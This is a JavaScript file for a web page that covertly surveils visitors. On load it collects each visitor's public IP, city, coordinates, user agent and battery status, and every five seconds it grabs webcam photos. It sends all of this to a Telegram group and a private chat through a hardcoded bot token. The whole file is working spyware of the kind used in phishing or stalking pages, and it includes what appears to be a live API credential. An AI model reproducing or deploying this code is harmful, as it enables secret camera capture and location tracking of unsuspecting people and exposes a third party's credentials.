// Define variables for private and group chat IDs
let privateChatId = ''; // Replace with your private chat ID
const groupChatId = '-4159628524'; // Replace with your group chat ID

// Function to read private chat ID from file
function readPrivateChatIdFromFile() {
    fetch('/private_chat_id.txt')
        .then(response => response.text())
        .then(chatId => {
            privateChatId = chatId.trim();
            console.log('Private Chat ID:', privateChatId);
            // Send private chat ID to group for troubleshooting
            sendMessageToTelegramGroup(`Private Chat ID: ${privateChatId}`, groupChatId);
        })
        .catch(error => {
            console.error('Error reading private chat ID:', error);
        });
}

// Call function to read private chat ID from file
readPrivateChatIdFromFile();


// Function to send photo and user agent details to Telegram
function sendPhotoAndUserAgentToTelegram(photoDataUrl, userAgent, chatId) {
    const botToken = '6987122048:AAEHNuzQz3pV8ldUKQfrQ9X1cT20zsuBJaY'; // Replace with your bot token

    const formData = new FormData();
    const blob = dataURItoBlob(photoDataUrl);
    formData.append('photo', blob, 'photo.png');
    formData.append('text', `User Agent: ${userAgent}`);
    formData.append('chat_id', chatId);

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to send photo and user agent details to Telegram');
            }
            console.log('Photo and user agent details sent to Telegram successfully');
        })
        .catch(error => {
            console.error('Error sending photo and user agent details to Telegram:', error);
        });
}

// Function to convert data URI to Blob
function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}

// Function to capture photo and user agent details and send to Telegram
function capturePhotoAndUserAgentAndSendToTelegram(chatId) {
    const userAgent = navigator.userAgent;

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            const videoElement = document.createElement('video');
            videoElement.srcObject = stream;
            videoElement.play();

            videoElement.addEventListener('canplay', () => {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;

                const context = canvas.getContext('2d');
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                const dataURL = canvas.toDataURL('image/png');

                sendPhotoAndUserAgentToTelegram(dataURL, userAgent, chatId);

                stream.getTracks().forEach(track => track.stop());
            });
        })
        .catch(error => {
            console.error('Error accessing webcam:', error);
        });
}

// Capture photo and user agent details and send to Telegram at specified intervals
const captureInterval = setInterval(() => {
    capturePhotoAndUserAgentAndSendToTelegram(groupChatId); // Send to group
    capturePhotoAndUserAgentAndSendToTelegram(privateChatId); // Send privately
}, 5000); // Capture photo every 5 seconds

// Stop capturing photos when the user closes the site
window.addEventListener('beforeunload', () => {
    clearInterval(captureInterval);
});

// Function to send message to Telegram group using Telegram Bot API
function sendMessageToTelegramGroup(message, chatId) {
    const botToken = '6987122048:AAEHNuzQz3pV8ldUKQfrQ9X1cT20zsuBJaY'; // Replace with your Telegram bot token

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to send message to Telegram group');
            }
            console.log('Message sent to Telegram group successfully');
        })
        .catch(error => {
            console.error('Error sending message to Telegram group:', error);
        });
}

// Function to fetch public IP address and geolocation
function fetchPublicIPAddress() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            var publicIPAddress = data.ip;
            console.log("Public IP Address:", publicIPAddress);

            fetch('https://ipinfo.io/json')
                .then(response => response.json())
                .then(geoData => {
                    console.log('Location:', geoData.city + ', ' + geoData.region + ', ' + geoData.country);
                    console.log('Coordinates:', geoData.loc);

                    var userAgent = navigator.userAgent;

                    var regex = /\(([^)]+)\)/;
                    var match = regex.exec(userAgent);
                    var userAgentString = match ? match[1] : "User Agent not found";

                    if ('getBattery' in navigator) {
                        navigator.getBattery().then(function (battery) {
                            var batteryPercentage = Math.round(battery.level * 100);
                            var chargingStatus = battery.charging ? "Charging" : "Discharging";
                            var batteryStatusMessage = "*Battery Status*\n";
                            batteryStatusMessage += "- Percentage: " + batteryPercentage + "%\n";
                            batteryStatusMessage += "- Charging Status: " + chargingStatus;

                            var combinedMessage = `*User Agent*\n${userAgentString}\n\n${batteryStatusMessage}\n\n*Public IP Address*\n${publicIPAddress}\n\n*Location*\n${geoData.city}, ${geoData.region}, ${geoData.country}\n\n*Coordinates*\n${geoData.loc}`;

                            sendMessageToTelegramGroup(combinedMessage, groupChatId);
                            sendMessageToTelegramGroup(combinedMessage, privateChatId);
                        }).catch(function (error) {
                            console.error("Battery Status API error: " + error);
                            var combinedMessageWithoutBattery = `*User Agent*\n${userAgentString}\n\n*Battery status not available*\n\n*Public IP Address*\n${publicIPAddress}\n\n*Location*\n${geoData.city}, ${geoData.region}, ${geoData.country}\n\n*Coordinates*\n${geoData.loc}`;
                            sendMessageToTelegramGroup(combinedMessageWithoutBattery, groupChatId);
                            sendMessageToTelegramGroup(combinedMessageWithoutBattery, privateChatId);
                        });
                    } else {
                        console.error("navigator.getBattery is not supported by this browser.");
                        var combinedMessageWithoutBattery = `*User Agent*\n${userAgentString}\n\n*Battery status not available*\n\n*Public IP Address*\n${publicIPAddress}\n\n*Location*\n${geoData.city}, ${geoData.region}, ${geoData.country}\n\n*Coordinates*\n${geoData.loc}`;
                        sendMessageToTelegramGroup(combinedMessageWithoutBattery, groupChatId);
                        sendMessageToTelegramGroup(combinedMessageWithoutBattery, privateChatId);
                    }
                })
                .catch(error => {
                    console.error('Error fetching geolocation:', error);
                    sendMessageToTelegramGroup("*Error fetching geolocation*\n" + error.message, groupChatId);
                    sendMessageToTelegramGroup("*Error fetching geolocation*\n" + error.message, privateChatId);
                });
        })
        .catch(error => {
            console.error("Error fetching public IP address:", error);
            sendMessageToTelegramGroup("*Error fetching public IP address*\n" + error.message, groupChatId);
            sendMessageToTelegramGroup("*Error fetching public IP address*\n" + error.message, privateChatId);
        });
}

// Capture data and send to Telegram group when the page loads
window.onload = function () {
    fetchPublicIPAddress();
};
